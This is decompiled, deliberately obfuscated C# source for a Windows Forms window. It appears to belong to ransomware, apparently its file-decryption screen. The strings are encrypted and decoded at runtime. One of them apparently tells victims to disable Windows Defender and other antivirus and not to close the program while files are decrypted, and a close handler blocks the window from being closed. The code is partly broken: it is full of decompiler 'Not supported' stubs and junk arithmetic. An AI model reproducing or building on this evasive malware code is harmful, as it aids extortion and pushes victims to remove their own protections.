	private static int set_ControlDomainPolicy/* Not supported: data(F3 54 FA FF) */;

	private static int get_Rank/* Not supported: data(BA A7 00 00) */;

	private static int GetDaysInYear/* Not supported: data(43 F3 F0 FF) */;

	private static int get_MDStreamVersion/* Not supported: data(91 58 E8 FF) */;

	private static int ToByteArray/* Not supported: data(08 E5 0E 00) */;

	private static int Ignore/* Not supported: data(D4 0A F9 FF) */;

	private static int SetOffset/* Not supported: data(32 57 0D 00) */;

	private static int MessageId/* Not supported: data(0C 78 F6 FF) */;

	private static int get_CurrentRegion/* Not supported: data(AD 68 4B 05) */;

	private static int __9__63_0/* Not supported: data(6E 42 01 00) */;

	private static int Location/* Not supported: data(3B 4A 00 00) */;

	private static int GetExecutingAssembly/* Not supported: data(FD 94 F8 FF) */;

	private static int ValidateYearInEra/* Not supported: data(94 41 00 00) */;

	private static int ParallelBitExtract/* Not supported: data(9F 5B FA FF) */;

	private static int LOG_ALERT/* Not supported: data(CC 2E FF FF) */;

	private static int WaitAll/* Not supported: data(B5 75 F5 FF) */;

	private static int get_IsEnum/* Not supported: data(54 47 F2 FF) */;

	private static int SystemThreadingTasks_TaskDebugView/* Not supported: data(54 CA FB FF) */;

	private static int ExitUpgradeableReadLock/* Not supported: data(78 14 07 00) */;

	private static int ForkJoin/* Not supported: data(B4 A8 01 00) */;

	private static int ConvertToSingleScalar/* Not supported: data(76 97 FF FF) */;

	private static int get_ControlEvidence/* Not supported: data(31 E0 FD FF) */;

	private static int Stind_I8/* Not supported: data(C4 79 0D 00) */;

	private static int Parse/* Not supported: data(5B DC FF FF) */;

	private static int GetAssemblyName/* Not supported: data(6B 86 F5 FF) */;

	private static int RequestRefuse/* Not supported: data(48 B1 00 00) */;

	private static int op_Division/* Not supported: data(09 25 F6 FF) */;

	private static int IComparer__1/* Not supported: data(34 A1 F7 FF) */;

	private static int SetOnCountdownMres/* Not supported: data(49 55 00 00) */;

	private static int Associates/* Not supported: data(F5 71 00 00) */;

	private static int SysConfName/* Not supported: data(BC FC FE FF) */;

	private static int IdManager/* Not supported: data(1C 2F 08 00) */;

	private static int Extend/* Not supported: data(27 93 FE FF) */;

	private static int GetMethodSigHelper/* Not supported: data(9D 71 01 00) */;

	private static int SetField/* Not supported: data(CC 5B F1 FF) */;

	private static int UsingNamespace/* Not supported: data(43 84 FD FF) */;

	private static int ArrayListEnumerator/* Not supported: data(41 84 FD FF) */;

	private static int DoNotWrapExceptions/* Not supported: data(26 3E 01 00) */;

	private static int get_ElapsedTicks/* Not supported: data(16 C8 34 0D) */;

	private static int Remaining/* Not supported: data(B4 9D 70 06) */;

	private static int FromEnd/* Not supported: data(47 AB F5 FF) */;

	private static int GetOrCreateThreadLocals/* Not supported: data(4A 77 FE FF) */;

	private static int Ldc_I4_1/* Not supported: data(3B 82 FF FF) */;

	private static int MbcsString/* Not supported: data(9B EF 05 00) */;

	private static int int_3/* Not supported: data(49 12 F2 FF) */;

	private static int DebuggerTypeProxyAttribute/* Not supported: data(CF 07 01 00) */;

	private static int PackUnsignedSaturate/* Not supported: data(11 01 00 00) */;

	private static int ReadInt32BigEndian/* Not supported: data(51 FA FF FF) */;

	private static int Conv_Ovf_U_Un/* Not supported: data(CD 4E F9 FF) */;

	private static int EventWrittenEventArgs/* Not supported: data(B2 04 00 00) */;

	private static int RegisteredWaitHandleSafe/* Not supported: data(BB C0 FA FF) */;

	private static int VT_HRESULT/* Not supported: data(B9 6B F7 FF) */;

	private static int Multiply10/* Not supported: data(49 11 00 00) */;

	private static int Sunday/* Not supported: data(1A 87 04 00) */;

	private static int GetBaseDefinition/* Not supported: data(A5 A1 03 00) */;

	private static int Sqm/* Not supported: data(A1 B2 00 00) */;

	private static int Lower/* Not supported: data(CC 00 0B 00) */;

	private static int Register/* Not supported: data(B1 A7 06 00) */;

	private static int SEP_DaySuff/* Not supported: data(22 80 00 00) */;

	private static int CompilationKeyword/* Not supported: data(BA FD 01 00) */;

	private static int GreaterThanAll/* Not supported: data(28 69 07 00) */;

	private static int get_CurrentManagedThreadId/* Not supported: data(4D E4 0D 00) */;

	private static int EnumeratorCancellationAttribute/* Not supported: data(13 B4 FA FF) */;

	private static int get_IsCanceled/* Not supported: data(2F 62 04 00) */;

	private static int CheckName/* Not supported: data(A1 C6 FD FF) */;

	private static int AssemblyTitleAttribute/* Not supported: data(5B CC FF FF) */;

	private static int VarEnum/* Not supported: data(B3 03 F5 FF) */;

	private static int MetadataTag/* Not supported: data(7E 4C F7 FF) */;

	private static int IsContextful/* Not supported: data(F1 D9 0D 00) */;

	private static int get_IsVirtual/* Not supported: data(B1 03 00 00) */;

	private static int InvalidProgramException/* Not supported: data(CD 19 00 00) */;

	private static int IsValidUnicodeScalar/* Not supported: data(A1 E0 F1 FF) */;

	private static int SYS_WIN64/* Not supported: data(C7 F1 0E 00) */;

	private static int Block64/* Not supported: data(4E FD FF FF) */;

	private static int Tuple__7/* Not supported: data(FE 9F 03 00) */;

	private static int get_Ticks/* Not supported: data(72 9F 06 00) */;

	private static int EndsWith/* Not supported: data(3B 5D 0F 00) */;

	private static int PoolExhausted/* Not supported: data(42 03 0A 00) */;

	private static int ZipHigh/* Not supported: data(E7 A9 07 00) */;

	public EraInfo()
	{
		int[] array = new int[2] { 2462505, 830754 };
		int num = default(int);
		switch (checked(array[1] + -830752))
		{
		case 0:
			num = 418138;
			break;
		case 1:
			num = 737115;
			break;
		case 2:
			num = -403355;
			break;
		}
		int num2 = ((72649 <= num) ? (-890556) : 880668);
		int num3 = (Reserved2 = ((-72048 <= num2) ? PreserveBaseOverridesAttribute : (array[0] % 985002)));
		TryReadUInt16LittleEndian = SAKA;
		Impersonation = 0;
		LeadingZeroCount = new UnorderedNotEqualSignaling(MultiplyDoublingWideningLowerAndAddSaturate.ResourceLocator);
		DeserializationToken = null;
		((Form)this)._002Ector();
		KeyFile();
	}

	private unsafe void get_HResult(object sender, EventArgs e)
	{
		char[] array = new char[7] { '\u0001', '窨', '%', '\u0010', '\a', '\u0003', 'ہ' };
		int[] array2 = new int[6] { 2, 0, -1, -421995, 922479858, 1808213762 };
		int[] array3 = new int[_003CModule_003E.KeyValuePair__2[0]];
		array3[Convert.ToInt32("0", 2)] = 4624;
		array3[1868684707 / Convert.ToInt32("6f61dda3", 16)] = checked(Convert.ToInt32("3", 16) * 1);
		array3[2] = Convert.ToInt32(char.ToString('5') + "45645", ((Array)(object)"\u036e\u0313\u0329\u035a\u036a\u0366.\u0347").Length);
		int[] array4 = array3;
		get_IsAllocated = new Timer();
		get_IsAllocated.Interval = 1000.0;
		get_IsAllocated.Elapsed += TrackerSupport;
		get_IsAllocated.Start();
		((Control)HString).set_Text("");
		int num5 = default(int);
		int num7 = default(int);
		foreach (string item in get_UnmanagedCode.AsUIntPtr)
		{
			TextBox hString = HString;
			string text = ((Control)hString).get_Text();
			string text2 = char.ToString((char)Marshal.SizeOf(typeof(Sort)));
			string string_ = "맍맀";
			object[] array5 = new object[34926235 >> (int)((Array)(object)"\u0353\u0302\u036c\u0317\u0358\u0354\u0333\u0369\u036f\u0353\u033e\u033d\u0339\u036e\u032a\u0310\u0337\u0332\u0318h\u0333\u0369\u0352").LongLength];
			int num = ((2547 < Convert.ToInt32("11111111111100001111100110100001", 2)) ? Marshal.SizeOf(typeof(ClearShadowCopyPath)) : 0);
			int num2 = ((set_AbbreviatedMonthNames == -99016) ? 8802 : 721454);
			array5[num] = (char)num2;
			array5[_003CModule_003E.ActivityOptions[2]] = int_0 - -465909;
			array5[2] = -218693 + Convert.ToInt32("655543", 8);
			array5[_003CModule_003E.KeyValuePair__2[get_PositiveInfinity]] = (char)checked(Convert.ToInt32("1735321", 8) - 491849);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_, array5);
			string text3 = text2 + string_;
			string text4 = char.ToString((char)HashUpdate2);
			string text5 = char.ToString('ᯢ');
			string string_2 = string.Concat(char.ToString('玏'), char.ToString('王') + char.ToString('玚') + "玛珅珟");
			object[] array6 = new object[6];
			array6[Convert.ToInt32("0", 8)] = 14205;
			array6[(uint)array[0]] = 529;
			int num3 = ((1 != get_PositiveInfinity) ? 2 : (-303475));
			array6[num3] = (byte)((nint)((Array)(object)string.Empty).LongLength & 1) != 0;
			array6[3] = 6652;
			array6[4] = string.Concat(char.ToString('.'), char.ToString('ޛ'), char.ToString('P') + "ʠ\r\u0001\u0005");
			array6[5] = -10701 ^ Convert.ToInt32("ffffdc3d", 16);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array6);
			string string_3 = string.Concat(text3, text4 + text5 + string_2);
			char c = (char)array4[_003CModule_003E.ActivityOptions[2]];
			object[] array7 = new object[(int)c];
			int num4 = (WaitHandleExtensions ^ (_003CModule_003E.KeyValuePair__2[109] - -769621)) * ~Convert.ToInt32(char.ToString('5') + char.ToString('6') + "1b8", ((Array)(object)"\u032d\u032f\u032c\u0365\u032b\u0309\u0333\u0355\u036d\u0347\u0342\u0357.\u0358\u0352\u0333").Length);
			char c2 = (char)(0 << (int)array[3]);
			array7[num4] = (byte)((int)c2 % -352169) != 0;
			string string_4;
			object[] array8;
			checked
			{
				switch (1 * unchecked(1 * Marshal.SizeOf(typeof(UseHebrewParsing))))
				{
				case 0:
					num5 = 920503;
					break;
				case 1:
					num5 = -276328;
					break;
				case 2:
					num5 = Convert.ToInt32("11111111" + "111101101100010000000101", 2);
					break;
				}
				array7[(-63896 >= num5) ? HasFlagsAttribute : unchecked(-308356 / Convert.ToInt32("1", 8))] = (array2[3] ^ 0xA81C8 ^ -255137) + unchecked(Convert.ToInt32("1001110000110001", 2) % 15994 * checked(-41 * unchecked((int)array[5])));
				string_4 = "赘起";
				array8 = new object[Convert.ToInt32("5", 16) * Convert.ToInt32("1", 16)];
			}
			array8[(nint)((Array)(object)string.Empty).LongLength] = -3251 * array2[2];
			array8[1] = string.Concat(char.ToString('ˑ'), char.ToString('Ĩ') + char.ToString('.') + "\u000f\u0003");
			array8[1844959716 / array2[4]] = _003CModule_003E.KeyValuePair__2[Convert.ToInt32("e", 16)];
			array8[3] = Convert.ToInt32(char.ToString('3') + "52", 8);
			array8[4] = (int)array[1];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_4, array8);
			array7[(nint)((Array)(object)string_4).LongLength] = checked(824212 + unchecked(Marshal.SizeOf(typeof(FullName)) * -1));
			_003CModule_003E.GetMaxByteCount(ref string_3, array7);
			string text6 = string_3;
			string string_5 = "声壷";
			object[] array9 = new object[Convert.ToInt32("3", _003CModule_003E.get_PositiveSign[3])];
			array9[0] = 21124;
			array9[(nint)((Array)(object)"\u0312").LongLength] = false;
			array9[sizeof(char)] = (char)((uint)Convert.ToInt32("11010101110101111010", 2) ^ 0xD4E5Au);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array9);
			string string_6 = string_5;
			string string_7 = "Ӏ";
			object[] array10 = new object[checked(Convert.ToInt32("1010011111010001110", 2) - 343691)];
			array10[(Convert.ToInt32("f0f2", 16) != _003CModule_003E.ActivityOptions[98]) ? 484104 : 0] = char.ToString((char)Convert.ToInt32("244", 8)) + "\u0082\u008d";
			array10[Convert.ToInt32("1", ((Array)(object)"\u0306\u0325\u0345\u032c\u0328\u036e\u0365\u0357\u035b\u034b\u0351\u0355\u035b\u0342\u031c\u0357").Length)] = Convert.ToInt32("ac", Marshal.SizeOf(typeof(PrepareDelegate)));
			array10[2] = 659;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array10);
			string value = string_7;
			string string_8 = string.Concat(char.ToString((char)_003CModule_003E.ActivityOptions[99]), char.ToString('堼') + "堼堼");
			object[] array11;
			checked
			{
				array11 = new object[-696284 + Rank];
				array11[(-64661 <= Convert.ToInt32("37776565026", 8)) ? 639796 : Convert.ToInt32("0", 8)] = 419 * unchecked((int)array[2]);
				array11[1] = 3628;
				array11[array2[array2[1]]] = 1680;
			}
			int num6 = (int)array[4] >> Convert.ToInt32("1", 2);
			char c3 = array[6];
			array11[num6] = (int)c3;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_8, array11);
			object[] array12 = new object[Convert.ToInt32(value, Convert.ToInt32(string_8, _003CModule_003E.ActivityOptions[0]))];
			switch (449519 - 806884810 / get_TimeSeparator)
			{
			case 0:
				num7 = -532520;
				break;
			case 1:
				num7 = -57786;
				break;
			}
			int num8 = ((num7 >= -236136) ? (((_003CModule_003E.get_PositiveSign[118] != 57995) ? Convert.ToInt32("ed459", 16) : 0) % (Convert.ToInt32("11111111111111111100010100111100", 2) - Convert.ToInt32("1011110001010001110", 2))) : (-711586));
			checked
			{
				array12[num8] = array4[unchecked(Convert.ToInt32("0", 16) % -772089) * 387290];
			}
			array12[array4[array2[5] / 904106881] + -183204] = 11081;
			_003CModule_003E.GetMaxByteCount(ref string_6, array12);
			((Control)hString).set_Text(text + text6 + item + string_6);
		}
	}

	private void get_CurrentCount(object sender, FormClosingEventArgs e)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Invalid comparison between Unknown and I4
		int[] array = new int[3] { 6, 3, 3167 };
		CloseReason closeReason = e.get_CloseReason();
		string string_ = string.Concat(char.ToString('陞') + "陚陚", char.ToString('陚') + char.ToString('陚') + "陚陚陚陚陚陘");
		object[] array2 = new object[array[0]];
		array2[get_PositiveInfinity] = (char)(_003CModule_003E.get_PositiveSign[119] % 13476);
		array2[get_CurrencyGroupSeparator] = (byte)((Array)(object)string.Empty).Length != 0;
		IntPtr intPtr = (nint)((Array)(object)"\u0326\u034f").LongLength;
		char c = (char)array[2];
		array2[(nint)intPtr] = c;
		array2[array[1]] = 6968;
		array2[_003CModule_003E.ActivityOptions[3]] = 13954;
		char c2 = (char)Convert.ToInt32("5", 16);
		array2[(int)c2] = 7682;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_, array2);
		int num = Convert.ToInt32(string_, Convert.ToInt32("8", 16));
		int num2 = Convert.ToInt32("25775164054", 8);
		((CancelEventArgs)(object)e).Cancel = (int)closeReason == checked(num * (num2 | Convert.ToInt32("11" + "110011111110111101011111110111", ((Array)(object)"\u031e\u034c").Length)));
	}

	private unsafe void LoadAssemblyAndGetFunctionPointer(object sender, EventArgs e)
	{
		char[] array = new char[7] { '\u073c', '\u0015', 'ᛝ', 'f', 'ݵ', '氚', '粟' };
		int[] array2 = new int[12]
		{
			0, 1, 7034, 740262, 245490, 8, 5, -926627, 386, -46694,
			155, 239107
		};
		char[] array3 = new char[1];
		array3[_003CModule_003E.ActivityOptions[100] >> 16] = '\u0004';
		char[] array4 = array3;
		int[] array5 = new int[Convert.ToInt32("1", 2)];
		array5[0] = checked(array2[7] - -927257);
		int[] array6 = array5;
		if (Property())
		{
			((Control)OverwriteExisting).set_Text(get_UnmanagedCode.add_ModuleResolve);
			Label obj = get_Modules;
			string text = char.ToString((char)checked(-9687 * Convert.ToInt32("37777777775", 8)));
			string string_ = string.Concat(char.ToString('橡'), char.ToString('橳') + "橴橥");
			object[] array7 = new object[(nint)((Array)(object)(char.ToString('\u0332') + "\u036b\u0347")).LongLength];
			array7[0 << PrivateScope] = (byte)((Array)(object)string.Empty).Length != 0;
			array7[1] = 7108;
			array7[Convert.ToInt32("2", 8)] = (char)(Convert.ToInt32("125", 8) % 34);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_, array7);
			string text2 = text + string_;
			string text3 = char.ToString((char)(455560 - Convert.ToInt32("1101000000110010011", 2)));
			string string_2 = "挶挠";
			object[] array8 = new object[3];
			array8[_003CModule_003E.ActivityOptions[Convert.ToInt32("1", 16)]] = 'ȉ';
			array8[5 % Convert.ToInt32("10", 2)] = char.ToString('ɋ') + "ʀĀ";
			array8[checked(458879 - FilterNameIgnoreCase)] = 2758;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array8);
			string text4 = text3 + string_2;
			string string_3 = "ぢづ";
			object[] array9 = new object[Convert.ToInt32("4", array2[5])];
			array9[0] = (byte)(_003CModule_003E.ActivityOptions[101] - -206473) != 0;
			int num = ((((12891 > Convert.ToInt32("fffcc608", 16)) ? 1 : 0) != _003CModule_003E.ActivityOptions[1]) ? 1 : _003CModule_003E.KeyValuePair__2[110]);
			array9[num] = array2[2];
			array9[2] = Convert.ToInt32("fff84502", 16) ^ -507417;
			array9[3] = char.ToString((char)Convert.ToInt32("16c2", 16)) + "\u0a55L";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_3, array9);
			string text5 = string_3;
			string string_4 = "萀葋";
			object[] array10;
			checked
			{
				array10 = new object[283493 + Convert.ToInt32("11111111111110111010110010011110", 2)];
				array10[581195 + Convert.ToInt32("37775620665", 8)] = 9578;
			}
			array10[Convert.ToInt32("1", 8) * 1] = '킋';
			array10[2] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_4, array10);
			string text6 = string_4;
			string string_5 = string.Concat(char.ToString('衲') + "衮蠷", char.ToString('衿') + char.ToString('衲') + "补衲蠹");
			object[] array11 = new object[Marshal.SizeOf(typeof(OverlappedData))];
			array11[(nint)((Array)(object)string.Empty).LongLength] = checked(-536031 + Convert.ToInt32("2204746", 8));
			array11[sizeof(byte)] = char.ToString((char)Convert.ToInt32("10000001010", 2)) + "\u05edƢ";
			array11[Convert.ToInt32("2", Convert.ToInt32("1000", 2))] = (char)Convert.ToInt32(char.ToString('1') + char.ToString('1') + "b4", 16);
			array11[Convert.ToInt32("3", 16)] = string.Concat(char.ToString((char)Convert.ToInt32("3", 16)), char.ToString(']'), char.ToString('\u0003') + "\u0005\u0004\u0002");
			int num2 = get_ResourceExposureLevel;
			char c = (char)Convert.ToInt32("0", 2);
			array11[num2] = (byte)(int)c != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array11);
			string string_6 = string.Concat(text2, text4, text5 + text6 + string_5);
			string string_7 = "쟴";
			object[] array12 = new object[checked(Convert.ToInt32("37777271222", 8) + _003CModule_003E.KeyValuePair__2[112])];
			IntPtr intPtr = (nint)((Array)(object)string.Empty).LongLength;
			int initLocals = InitLocals;
			array12[(nint)intPtr] = initLocals;
			int num3 = ((0 != get_PositiveInfinity) ? 442678 : Convert.ToInt32("1", 2));
			array12[num3] = char.ToString((char)array2[8]) + "\u0084ȵ";
			array12[Convert.ToInt32("2", 8)] = 32154;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array12);
			object[] array13 = new object[Convert.ToInt32(string_7, 0xB4BB6 ^ array2[_003CModule_003E.KeyValuePair__2[0]])];
			int num4 = (array2[4] - 245490) * (_003CModule_003E.get_PositiveSign[(nint)((Array)(object)"\u0305\u0348.\u033b\u0310\u031b\u032f\u0339\u034d\u0489\u0340\u031e\u0331\u0301\u036e\u0322\u0352").LongLength] ^ (Convert.ToInt32("d3fb481", 16) >> 9));
			int num5 = array6[0];
			int num6 = Convert.ToInt32(char.ToString('1') + "76", 8);
			int num7 = Convert.ToInt32("1", 2);
			array13[num4] = num5 % (num6 << num7);
			string string_8 = "\u086c";
			object[] array14 = new object[(Convert.ToInt32("37777755403", 8) < 776168) ? 4 : Convert.ToInt32("11001110000001110", 2)];
			array14[0] = 'к';
			array14[array2[1]] = 500;
			array14[2] = string.Concat("ġ\u000f", char.ToString('\u0015') + "\v\b\n\u0014");
			array14[3] = char.ToString(array[3]) + ")*";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_8, array14);
			array13[Convert.ToInt32(string_8, (int)((CreateComInterfaceFlags == _003CModule_003E.KeyValuePair__2[15]) ? ((-59558 != Convert.ToInt32("fffea1c3", 16)) ? ((Array)(object)"\u0313\u032b").LongLength : Convert.ToInt32("3ff93", 16)) : ((91493 != array2[9]) ? 995343 : (-848806))))] = ~(checked(-21 * NumberGroupSizes) / (1 & Convert.ToInt32("1", 16)));
			string string_9 = "䱻䱞";
			object[] array15 = new object[0 | sizeof(int)];
			array15[Convert.ToInt32("0", 2)] = MethodHandle;
			array15[1] = array[4] & 0x55D;
			array15[array2[10] >> 6] = false;
			array15[3] = _003CModule_003E.ActivityOptions[15];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_9, array15);
			IntPtr intPtr2 = (nint)((Array)(object)string_9).LongLength;
			string string_10 = string.Concat(char.ToString('鴨') + char.ToString('鴩') + "鴨鴩鴨", "鴨鴩鴩鴩" + "鴩鴩鴨鴨" + "鴩鴨鴩鴨鴨鴨鴩");
			object[] array16 = new object[(nint)((Array)(object)(char.ToString('\u032d') + "\u0311\u0323")).LongLength];
			int num8 = array[5];
			array16[0] = num8;
			array16[array2[1]] = (int)array[0];
			array16[2] = Marshal.SizeOf(typeof(GetInstance));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_10, array16);
			array13[(nint)intPtr2] = (char)checked(Convert.ToInt32(string_10, 2) + 341666 * HexIntPtrType);
			int num9;
			if (-94053 == ~(~Convert.ToInt32("11111111111111101000101001010110", 2)))
			{
				num9 = add_ResourceResolve;
			}
			else
			{
				int num10 = ((((_003CModule_003E.get_PositiveSign[19] < (Convert.ToInt32("35204100046", 8) | -536949704)) ? 1 : 0) != Convert.ToInt32("0", 8)) ? 91628 : Convert.ToInt32("3", 8));
				num9 = num10;
			}
			array13[num9] = 7119;
			char num11 = array4[0];
			int num12 = Convert.ToInt32("3777" + "7477666", 8) ^ -98418;
			array13[(uint)num11] = (char)num12;
			_003CModule_003E.GetMaxByteCount(ref string_6, array13);
			((Control)obj).set_Text(string_6);
			((Control)get_Modules).set_ForeColor(Color.LightGreen);
			((Control)Ldloc).set_Text("");
			((Control)TryRunSingle).set_Text("");
			Panel marvinSeed = MarvinSeed;
			int num13 = _003CModule_003E.KeyValuePair__2[4];
			int red = num13 * checked((-645163 ^ Convert.ToInt32("11111111111101000001101000000110", 2)) + -146894);
			string string_11 = "\u0739\u073a";
			object[] array17 = new object[4];
			array17[0] = 1663;
			array17[1] = (char)Convert.ToInt32(char.ToString('1') + "05", Convert.ToInt32("1000", 2));
			array17[(nint)((Array)(object)"\u0318\u0353").LongLength] = (byte)get_PositiveInfinity != 0;
			array17[3] = 73;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_11, array17);
			string value = string_11;
			int num14 = Convert.ToInt32("fff" + "fd0d5", 16);
			int num15 = _003CModule_003E.KeyValuePair__2[113];
			int green = Convert.ToInt32(value, (num14 != num15) ? 41660 : Convert.ToInt32("8", 16));
			char c2 = array[Convert.ToInt32("1", 2)];
			char num16 = c2;
			int num17 = default(int);
			switch (HtmlEntities)
			{
			case 678147:
				num17 = _003CModule_003E.ActivityOptions[103];
				break;
			case 678148:
				num17 = 861831;
				break;
			case 678149:
				num17 = 523771;
				break;
			}
			((Control)marvinSeed).set_BackColor(Color.FromArgb(red, green, (int)((uint)num16 << num17 / checked(Convert.ToInt32("731451317", 8) * 4))));
			TextBox obj2 = get_DaylightDelta;
			string text7 = char.ToString((char)Convert.ToInt32("11" + "0011" + "111110110", 2));
			string string_12 = "䯙䯁";
			object[] array18 = new object[0 | array2[6]];
			array18[0] = Convert.ToInt32(char.ToString('3') + "c7", 16);
			array18[get_CurrencyGroupSeparator] = false;
			char c3 = (char)Convert.ToInt32("2", 8);
			char num18 = c3;
			int num19 = ((Convert.ToInt32("1001000001101110", 2) > -650939) ? Convert.ToInt32("16b8", 16) : (-487157));
			array18[(uint)num18] = num19;
			array18[3] = 355;
			array18[Convert.ToInt32("4", Convert.ToInt32("20", 8))] = string.Concat("ٯƦ", char.ToString('ޙ') + char.ToString('e') + "\u0003\u000e\u0002");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_12, array18);
			string text8 = text7 + string_12;
			string string_13 = string.Concat("ꔚꕎꕕꔚ" + "ꕾꕟꕙꕈꕃꕊ", "ꕎꔚ" + "ꕜꕓꕖꕟꕉꔀꔷꔰꔚ", "ꕿꕔꕎꕟꕈꔚꕞꕟꕙꕈꕃꕊ" + "ꕎꕓꕕꕔꔚꕑꕟꕃꔚꕛꕔꕞꔚꕙꕖꕓꕙꕑꔚꕕꕔꔚꕾ");
			int num20 = Marshal.SizeOf(typeof(CharSetMask));
			object[] array19 = new object[num20];
			array19[0] = (char)checked(-733272 + Marshal.SizeOf(typeof(GetRuntimeField)));
			array19[(52228 <= Marshal.SizeOf(typeof(ToObject))) ? 1 : 97709] = 23560;
			array19[sizeof(short)] = 8663;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_13, array19);
			string text9 = string_13;
			string string_14 = string.Concat("\udaf0\udaf6\udae7" + "\udaec\udae5\udae1" + "\udab5\udaf7\udae0\udae1\udae1\udafa\udafb\udabb\udab5\uda9f\udab5", "\udad8\udaf4\udafe\udaf0\udab5\udae6\udae0\udae7\udaf0\udab5\udac2\udafc\udafb\udaf1\udafa\udae2\udae6\udab5\udad1\udaf0" + "\udaf3\udaf0\udafb" + "\udaf1\udaf0\udae7\udab5\udaf4\udafb\udaf1\udab5\udaf4\udafb\udaec\udab5\udafa\udae1\udafd\udaf0\udae7\udab5\udaf4\udafb\udae1\udafc\udae3\udafc\udae7\udae0\udae6\udab5\udafc\udae6\udab5\udafa\udaf3\udaf3\udabb\uda98\uda9f\udab5\udad1\udafa\udab5\udafb\udafa\udae1\udab5\udaf6\udaf9\udafa\udae6\udaf0\udab5\udae1\udafd\udaf0\udab5\udaf4\udae5\udae5\udaf9\udafc\udaf6\udaf4\udae1\udafc\udafa\udafb\udab5\udae2\udafd\udafc\udaf9\udaf0\udab5\udaf1\udaf0\udaf6\udae7\udaec\udae5\udae1\udafc\udafb\udaf2\udab5\udafa\udae7\udab5\udaf0\udaf9\udae6\udaf0\udab5\udaf3\udafc\udaf9\udaf0\udae6\udab5\udaf8\udaf4\udaec\udab5\udaf2\udaf0\udae1\udab5\udaf6\udafa\udae7\udae7\udae0\udae5\udae1\udaf0\udaf1\udabb");
			object[] array20 = new object[4];
			array20[0] = 0x3A5FE ^ array2[11];
			array20[SecurityTransparentAttribute + -483506] = (byte)array2[0] != 0;
			array20[2] = "唆嶰";
			array20[Convert.ToInt32("3", 8)] = char.ToString('ë') + char.ToString('ӧ') + "\u0019\u008d";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_14, array20);
			string string_15 = string.Concat(text8, text9 + string_14);
			string string_16 = string.Concat(char.ToString('舅'), char.ToString('舅'), "舅艓" + "與舅艒舂");
			object[] array21 = new object[4];
			array21[_003CModule_003E.ActivityOptions[1]] = string.Concat(char.ToString('ഌ'), char.ToString('Ə'), char.ToString('䇭') + "\u1a60B");
			array21[checked(ELEMENT_TYPE_U2 + -13200)] = (int)array[2];
			array21[2] = 92;
			int num21 = endAction;
			int num22 = default(int);
			switch (get_UtcTicks)
			{
			case -369067:
				num22 = 0;
				break;
			}
			array21[num21] = (byte)num22 != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_16, array21);
			bool num23 = 73863 > Convert.ToInt32(string_16, 16);
			char c4 = (char)array2[0];
			int num25;
			if ((num23 ? 1u : 0u) == c4)
			{
				int num24 = ((-35239 < Convert.ToInt32("11111111111110000010110000111000", 2)) ? 956156 : _003CModule_003E.KeyValuePair__2[114]);
				num25 = ((num24 <= -580860) ? (StdCall + -782672) : Convert.ToInt32(char.ToString('3') + char.ToString('0') + "72017", 8));
			}
			else
			{
				int num26 = ((75425 >= CC_PASCAL) ? (-336363) : 272132);
				num25 = ((-77117 < num26) ? Marshal.SizeOf(typeof(ELEMENT_TYPE_BYREF)) : Marshal.SizeOf(typeof(ENODATA)));
			}
			object[] array22 = new object[num25];
			int num27 = 1 & (0 / (Convert.ToInt32("100101001001000101010101", 2) - Convert.ToInt32("1500547", 8)));
			int num28;
			string string_17;
			object[] array23;
			checked
			{
				num28 = unchecked(array[6] - -950000) - 985505;
				string_17 = string.Concat(char.ToString('욷') + "욷욷", char.ToString('욷') + char.ToString('욷') + "욷욷욳");
				array23 = new object[Convert.ToInt32("3", 8)];
			}
			array23[0] = (char)_003CModule_003E.ActivityOptions[104];
			array23[(nint)((Array)(object)"\u0319").LongLength] = 1716;
			char stream = (char)Stream;
			array23[(int)stream] = (byte)Convert.ToInt32("0", Convert.ToInt32("10000", 2)) != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_17, array23);
			array22[num27] = checked(num28 * Convert.ToInt32(string_17, -948637 - Convert.ToInt32("37774303123", 8)));
			array22[checked(Convert.ToInt32("fff2cbcc", 16) + Int32ToDecStr) - Convert.ToInt32("11111111111110110101000111110000", 2) - (374158 - _003CModule_003E.KeyValuePair__2[(nint)((Array)(object)"\u030f\u0314\u035c\u036b\u0326\u0346\u0318\u0319\u035d\u0347\u031f\u0352\u0333\u0357\u0327\u0365").LongLength])] = get_IsHideBySig;
			_003CModule_003E.GetMaxByteCount(ref string_15, array22);
			((Control)obj2).set_Text(string_15);
			get_IsAllocated.Stop();
		}
	}

	private unsafe void Lookup(object sender, EventArgs e)
	{
		//IL_16aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a68: Unknown result type (might be due to invalid IL or missing references)
		//IL_39af: Unknown result type (might be due to invalid IL or missing references)
		char[] array = new char[31]
		{
			'\u0002', '\0', '\u0001', '\u0006', '\u0003', '\u0004', '\u0005', '␦', 'ꁟ', '訙',
			'ݻ', 'ᴀ', '䂑', '⪓', 'न', 'ί', '❕', 'ͻ', '\u0010', '\b',
			'\u0013', 'a', '\u0ec8', 'Å', '\u0c53', 'j', '髐', '\u030b', '\u07ae', '?',
			'稄'
		};
		int[] array2 = new int[53]
		{
			2, 0, 1, 6, 3, 4, 5, 16, 3990, -445281,
			-345672, 25924, 1211, 8564, 14955, 120, -624073, 171992, 5874, -871516,
			-518883, 830003, 174185, 15, 8, 25, -162544, 70, 594, -443648,
			-358487, 24567, 538897, 439213794, 208698, -390849, 15004, 173, -228857, -129824,
